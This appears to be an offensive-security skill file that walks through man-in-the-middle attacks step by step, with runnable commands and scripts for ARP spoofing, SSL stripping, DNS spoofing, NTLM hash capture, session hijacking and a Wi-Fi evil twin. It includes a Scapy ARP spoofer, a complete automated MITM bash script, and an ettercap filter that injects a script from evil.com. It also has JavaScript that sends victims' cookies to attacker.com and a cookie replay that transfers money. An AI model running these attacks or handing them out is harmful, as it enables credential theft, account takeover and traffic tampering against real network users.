---
name: network-traffic-interception
description: Intercept, analyze, and manipulate network traffic (MITM, ARP spoofing, SSL stripping)
version: 1.0.0
author: harezadmm
tags: [mitm, arp-spoofing, wireshark, ettercap, bettercap, network]
---

# Network Traffic Interception

## When to Use
Intercepting and manipulating network traffic between targets. Man-in-the-Middle (MITM) attacks, credential harvesting, session hijacking, traffic analysis.

## Prerequisites
- Network access (same subnet as target)
- Linux machine with network tools
- Root/sudo access
- Network adapter supporting promiscuous mode
- Understanding of TCP/IP, ARP, DNS

## Attack Vectors

### 1. ARP Spoofing
Poison ARP cache to redirect traffic through attacker.

### 2. DNS Spoofing
Redirect DNS queries to malicious IPs.

### 3. SSL Stripping
Downgrade HTTPS to HTTP to capture plaintext.

### 4. Session Hijacking
Steal session cookies and tokens.

### 5. Packet Injection
Inject malicious packets into traffic stream.

### 6. Wi-Fi Evil Twin
Rogue access point impersonating legitimate network.

## Procedure

### Step 1: Network Reconnaissance

**Identify targets on network:**
```bash
# Scan network for active hosts
nmap -sn 192.168.1.0/24

# ARP scan (faster, less noisy)
arp-scan -l
arp-scan --interface=eth0 192.168.1.0/24

# Netdiscover
netdiscover -i eth0 -r 192.168.1.0/24

# List current ARP table
arp -a
ip neigh show

# Identify gateway
ip route | grep default
route -n
```

**Identify network services:**
```bash
# Port scan targets
nmap -sV -p- 192.168.1.100

# Check for HTTPS
nmap -p 443 --script ssl-cert 192.168.1.0/24

# Passive discovery with tcpdump
tcpdump -i eth0 -n
```

### Step 2: ARP Spoofing (Manual)

**Enable IP forwarding:**
```bash
# Enable packet forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward
sysctl -w net.ipv4.ip_forward=1

# Verify
cat /proc/sys/net/ipv4/ip_forward
```

**ARP spoof with arpspoof:**
```bash
# Install dsniff tools
apt-get install dsniff

# Spoof target (victim) telling them we're the gateway
arpspoof -i eth0 -t 192.168.1.100 192.168.1.1

# Spoof gateway telling it we're the target (bidirectional)
# Open second terminal:
arpspoof -i eth0 -t 192.168.1.1 192.168.1.100

# Now all traffic between 192.168.1.100 and gateway flows through attacker
```

**ARP spoof with Scapy:**
```python
#!/usr/bin/env python3
from scapy.all import *
import time
import sys

def get_mac(ip):
    """Get MAC address for given IP"""
    arp = ARP(pdst=ip)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether/arp
    result = srp(packet, timeout=3, verbose=0)[0]
    return result[0][1].hwsrc if result else None

def spoof(target_ip, spoof_ip, target_mac):
    """Send spoofed ARP reply"""
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(packet, verbose=0)

def restore(target_ip, gateway_ip, target_mac, gateway_mac):
    """Restore ARP tables"""
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac)
    send(packet, count=5, verbose=0)

if __name__ == "__main__":
    target_ip = "192.168.1.100"
    gateway_ip = "192.168.1.1"
    
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)
    
    if not target_mac or not gateway_mac:
        print("[-] Could not find MAC addresses")
        sys.exit(1)
    
    print(f"[+] Target MAC: {target_mac}")
    print(f"[+] Gateway MAC: {gateway_mac}")
    print("[*] Starting ARP spoofing... Press Ctrl+C to stop")
    
    try:
        while True:
            spoof(target_ip, gateway_ip, target_mac)
            spoof(gateway_ip, target_ip, gateway_mac)
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[*] Restoring ARP tables...")
        restore(target_ip, gateway_ip, target_mac, gateway_mac)
        restore(gateway_ip, target_ip, gateway_mac, target_mac)
        print("[+] ARP tables restored")
```

### Step 3: Bettercap (Modern MITM Framework)

**Install Bettercap:**
```bash
# Install dependencies
apt-get update
apt-get install build-essential libpcap-dev libusb-1.0-0-dev libnetfilter-queue-dev

# Install bettercap
apt-get install bettercap

# Or from source
go install github.com/bettercap/bettercap@latest
```

**Basic MITM with Bettercap:**
```bash
# Start bettercap
bettercap -iface eth0

# Inside bettercap shell:
```

```
# Set target
set arp.spoof.targets 192.168.1.100

# Full subnet
set arp.spoof.targets 192.168.1.0/24

# Enable ARP spoofing
arp.spoof on

# Enable network sniffer
net.sniff on

# Enable HTTP proxy (capture HTTP traffic)
set http.proxy.sslstrip true
http.proxy on

# Enable HTTPS proxy with SSL stripping
set https.proxy.sslstrip true
https.proxy on

# DNS spoofing
set dns.spoof.domains example.com
set dns.spoof.address 192.168.1.50
dns.spoof on

# Capture credentials
set net.sniff.verbose true
set net.sniff.local true
set net.sniff.filter tcp port 80 or tcp port 443

# Save capture to file
set net.sniff.output /tmp/capture.pcap

# View active sessions
net.show

# Check captured credentials
events.show 20
```

**Bettercap caplets (automated scripts):**
```bash
# Create caplet for HTTP/HTTPS interception
cat > http-capture.cap << 'EOF'
# Enable IP forwarding
!echo 1 > /proc/sys/net/ipv4/ip_forward

# Set target
set arp.spoof.targets 192.168.1.100

# SSL stripping
set http.proxy.sslstrip true
set https.proxy.sslstrip true

# Start modules
net.probe on
arp.spoof on
http.proxy on
https.proxy on
net.sniff on

# Credential collection
set net.sniff.verbose true
set net.sniff.local true
set net.sniff.output /tmp/http-capture.pcap

# Keep running
sleep 999999
EOF

# Run caplet
bettercap -iface eth0 -caplet http-capture.cap
```

### Step 4: SSL Stripping with SSLStrip

**Install and configure:**
```bash
# Install sslstrip
apt-get install sslstrip

# Setup iptables to redirect HTTPS to sslstrip
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 10000

# Start ARP spoofing (separate terminal)
arpspoof -i eth0 -t 192.168.1.100 192.168.1.1
arpspoof -i eth0 -t 192.168.1.1 192.168.1.100

# Start sslstrip
sslstrip -l 10000 -w /tmp/sslstrip.log

# Monitor captured data
tail -f /tmp/sslstrip.log
```

**SSLStrip+HSTS bypass (sslstrip+):**
```bash
# Clone sslstrip+
git clone https://github.com/LeonardoNve/sslstrip2
cd sslstrip2

# Install dependencies
pip3 install twisted service_identity

# Setup DNS spoofing with dnsspoof
dnsspoof -i eth0 -f hosts.txt

# hosts.txt content:
# 192.168.1.50 facebook.com
# 192.168.1.50 www.facebook.com

# Run sslstrip+
python3 sslstrip.py -l 10000 -w /tmp/captured.log

# Bypass HSTS with DNS spoofing to replace domains
# facebook.com -> faceb00k.com (visually similar)
```

### Step 5: Ettercap (Classic MITM Tool)

**Text interface:**
```bash
# ARP poisoning with unified sniffing
ettercap -T -i eth0 -M arp:remote /192.168.1.100// /192.168.1.1//

# Target format: /IP/MAC/PORT
# /192.168.1.100// = target IP, any MAC, any port
# /192.168.1.1// = gateway

# Capture to file
ettercap -T -i eth0 -M arp:remote -w /tmp/capture.pcap /192.168.1.100// /192.168.1.1//

# With filters (modify packets on the fly)
ettercap -T -i eth0 -F filter.ef -M arp:remote /192.168.1.100// /192.168.1.1//
```

**Graphical interface:**
```bash
# Start GUI
ettercap -G

# Steps in GUI:
# 1. Sniff -> Unified sniffing -> Select interface
# 2. Hosts -> Scan for hosts
# 3. Hosts -> Hosts list
# 4. Select target -> Add to Target 1
# 5. Select gateway -> Add to Target 2
# 6. MITM -> ARP poisoning
# 7. Start -> Start sniffing
```

**Ettercap filters (packet modification):**
```c
// filter.ecf - Replace "login" with "hacked" in HTTP
if (ip.proto == TCP && tcp.dst == 80) {
    if (search(DATA.data, "login")) {
        replace("login", "hacked");
        msg("Replaced login with hacked\n");
    }
}

// Inject JavaScript
if (ip.proto == TCP && tcp.dst == 80) {
    if (search(DATA.data, "</body>")) {
        replace("</body>", "<script src='http://evil.com/hook.js'></script></body>");
        msg("JavaScript injected\n");
    }
}

// Drop packets containing specific string
if (ip.proto == TCP && search(DATA.data, "secret")) {
    drop();
    msg("Packet dropped\n");
}
```

**Compile filter:**
```bash
etterfilter filter.ecf -o filter.ef
ettercap -T -i eth0 -F filter.ef -M arp:remote /192.168.1.100// /192.168.1.1//
```

### Step 6: DNS Spoofing

**DNSChef (DNS proxy for phishing):**
```bash
# Install
git clone https://github.com/iphelix/dnschef
cd dnschef
pip3 install -r requirements.txt

# Redirect all DNS queries to attacker IP
python3 dnschef.py --fakeip 192.168.1.50 --interface 192.168.1.50

# Specific domain spoofing
python3 dnschef.py --fakedomains facebook.com,google.com --fakeip 192.168.1.50

# Use with ARP spoofing
# Terminal 1: ARP spoof
arpspoof -i eth0 -t 192.168.1.100 192.168.1.1

# Terminal 2: Redirect DNS to dnschef
iptables -t nat -A PREROUTING -p udp --dport 53 -j REDIRECT --to-port 53

# Terminal 3: DNSChef
python3 dnschef.py --fakeip 192.168.1.50
```

**Responder (LLMNR/NBT-NS poisoning):**
```bash
# Install Responder
git clone https://github.com/lgandx/Responder
cd Responder

# Run Responder (captures NTLM hashes)
python3 Responder.py -I eth0 -wrf

# Captured hashes saved to Responder/logs/
# Crack with hashcat
hashcat -m 5600 ntlmhash.txt rockyou.txt
```

### Step 7: Session Hijacking

**Cookie stealing with JavaScript injection:**
```javascript
// Inject via MITM proxy
<script>
var cookie = document.cookie;
var xhr = new XMLHttpRequest();
xhr.open('POST', 'http://attacker.com/steal.php', true);
xhr.send('cookie=' + encodeURIComponent(cookie));
</script>
```

**Packet capture and cookie extraction:**
```bash
# Capture HTTP traffic
tcpdump -i eth0 -A 'tcp port 80' -w http.pcap

# Extract cookies from pcap
tshark -r http.pcap -Y "http.cookie" -T fields -e http.cookie

# Or use Wireshark filter: http.cookie
wireshark http.pcap
# Filter: http.cookie or http.set_cookie
```

**Replay attack with cURL:**
```bash
# Extract session cookie
COOKIE="session=abc123; token=xyz789"

# Replay request
curl -H "Cookie: $COOKIE" https://target.com/dashboard

# Modify and replay
curl -H "Cookie: $COOKIE" -X POST https://target.com/transfer -d "amount=1000&to=attacker"
```

### Step 8: Wi-Fi Evil Twin Attack

**Create rogue AP:**
```bash
# Install hostapd and dnsmasq
apt-get install hostapd dnsmasq

# Stop network manager
systemctl stop NetworkManager

# Configure hostapd
cat > /etc/hostapd/hostapd.conf << 'EOF'
interface=wlan0
driver=nl80211
ssid=Free_WiFi
hw_mode=g
channel=6
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
wpa=0
EOF

# Configure dnsmasq (DHCP)
cat > /etc/dnsmasq.conf << 'EOF'
interface=wlan0
dhcp-range=192.168.10.10,192.168.10.100,255.255.255.0,12h
dhcp-option=3,192.168.10.1
dhcp-option=6,192.168.10.1
server=8.8.8.8
log-queries
log-dhcp
EOF

# Setup interface
ifconfig wlan0 up
ifconfig wlan0 192.168.10.1 netmask 255.255.255.0

# Enable forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# NAT for internet access
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT

# Start services
hostapd /etc/hostapd/hostapd.conf &
dnsmasq -C /etc/dnsmasq.conf -d &

# Capture traffic
tcpdump -i wlan0 -w evil-twin.pcap

# Or run MITM tools on wlan0
bettercap -iface wlan0
```

**Automated Evil Twin with Wifiphisher:**
```bash
# Install
git clone https://github.com/wifiphisher/wifiphisher
cd wifiphisher
pip3 install -r requirements.txt

# Run (automatically creates evil twin and captive portal)
python3 wifiphisher.py -aI wlan0 -eI eth0

# Select target AP from list
# Wifiphisher creates fake AP and deauths clients from real AP
# Presents phishing portal to capture credentials
```

### Step 9: Traffic Analysis with Wireshark

**Capture credentials:**
```bash
# Start capture
wireshark

# Filters:
# HTTP Basic Auth
http.authbasic

# HTTP POST data (credentials)
http.request.method == "POST"

# FTP credentials
ftp.request.command == "USER" || ftp.request.command == "PASS"

# Telnet credentials
telnet contains "login" || telnet contains "password"

# SMTP AUTH
smtp.req.command == "AUTH"

# Follow TCP stream (right-click packet -> Follow -> TCP Stream)

# Export captured credentials
File -> Export Objects -> HTTP
```

**Decrypt SSL traffic (if private key available):**
```bash
# In Wireshark: Edit -> Preferences -> Protocols -> TLS
# Add RSA keys: IP, Port, Protocol, Key file

# Or set SSLKEYLOGFILE environment variable
export SSLKEYLOGFILE=/tmp/ssl-keys.log

# Firefox/Chrome will dump session keys
# Load in Wireshark: Edit -> Preferences -> Protocols -> TLS -> (Pre)-Master-Secret log filename
```

### Step 10: Complete MITM Attack Script

**Automated MITM script:**
```bash
#!/bin/bash
# mitm.sh - Complete MITM attack automation

TARGET_IP="192.168.1.100"
GATEWAY_IP="192.168.1.1"
INTERFACE="eth0"
CAPTURE_FILE="/tmp/mitm-$(date +%Y%m%d-%H%M%S).pcap"

echo "[*] Starting MITM attack"
echo "[*] Target: $TARGET_IP"
echo "[*] Gateway: $GATEWAY_IP"

# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward
echo "[+] IP forwarding enabled"

# Setup iptables for SSL stripping
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 10000
echo "[+] iptables rules configured"

# Start packet capture
tcpdump -i $INTERFACE -w $CAPTURE_FILE &
TCPDUMP_PID=$!
echo "[+] Packet capture started (PID: $TCPDUMP_PID)"

# Start sslstrip
sslstrip -l 10000 -w /tmp/sslstrip.log &
SSLSTRIP_PID=$!
echo "[+] SSLStrip started (PID: $SSLSTRIP_PID)"

# Start ARP spoofing
arpspoof -i $INTERFACE -t $TARGET_IP $GATEWAY_IP &
ARP1_PID=$!
arpspoof -i $INTERFACE -t $GATEWAY_IP $TARGET_IP &
ARP2_PID=$!
echo "[+] ARP spoofing started (PIDs: $ARP1_PID, $ARP2_PID)"

echo "[*] MITM attack active. Press Ctrl+C to stop."

# Cleanup on exit
cleanup() {
    echo "\n[*] Stopping attack..."
    kill $TCPDUMP_PID $SSLSTRIP_PID $ARP1_PID $ARP2_PID 2>/dev/null
    
    # Restore iptables
    iptables -t nat -F
    
    echo "[+] Capture saved to $CAPTURE_FILE"
    echo "[+] SSL stripped data in /tmp/sslstrip.log"
    echo "[*] Attack stopped"
}

trap cleanup INT
wait
```

## Pitfalls

**HSTS**: HTTP Strict Transport Security prevents SSL stripping on known HTTPS sites.

**Certificate pinning**: Apps with pinned certificates detect MITM.

**ARP detection**: Some networks monitor for ARP spoofing.

**Network segmentation**: VLANs prevent cross-segment attacks.

**Encrypted traffic**: TLS 1.3 makes MITM harder without private keys.

## Verification

```bash
# Verify ARP poisoning worked
# On target machine:
arp -a
# Gateway MAC should show attacker's MAC

# Check packet capture
tcpdump -r capture.pcap | head -20

# Verify traffic is flowing through attacker
iftop -i eth0
# Should see traffic from target

# Check captured credentials
cat /tmp/sslstrip.log
grep -i "password" /tmp/sslstrip.log
```

## OPSEC

- Use on authorized networks only (lab, pentest engagement)
- ARP spoofing is noisy and detectable
- Monitor for IDS/IPS alerts
- Restore ARP tables when finished
- Clear iptables rules after attack
- Use VPN/proxy when exfiltrating captured data
- Don't attack critical infrastructure

## References

- Wireshark User Guide
- Bettercap documentation
- Ettercap man pages
- MITM attack detection (Arpwatch, Snort)
- SSL/TLS security (RFC 5246, RFC 8446)
